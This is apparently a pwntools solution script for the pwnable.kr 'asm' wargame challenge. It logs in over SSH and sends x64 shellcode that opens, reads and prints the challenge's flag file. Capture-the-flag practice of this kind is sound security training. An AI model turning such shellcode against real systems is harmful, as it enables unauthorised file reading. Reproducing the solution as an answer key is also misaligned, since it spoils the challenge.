#!/usr/bin/python2
from pwn import *
context(arch = 'amd64', os = 'linux')

print('Connecting to asm@pwnable.kr:2222.......')
s = ssh('asm', 'pwnable.kr', 2222, 'guest')
p = s.connect_remote('localhost', 9026)
p.recvuntil('give me your x64 shellcode: ')

shellcode = shellcraft.pushstr('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')
shellcode += shellcraft.open('rsp', 0, 0)
shellcode += shellcraft.read('rax', 'rsp', 100)
shellcode += shellcraft.write(1, 'rsp', 100) + '\n'

p.send(asm(shellcode))
sleep(1)
print(p.recvline())
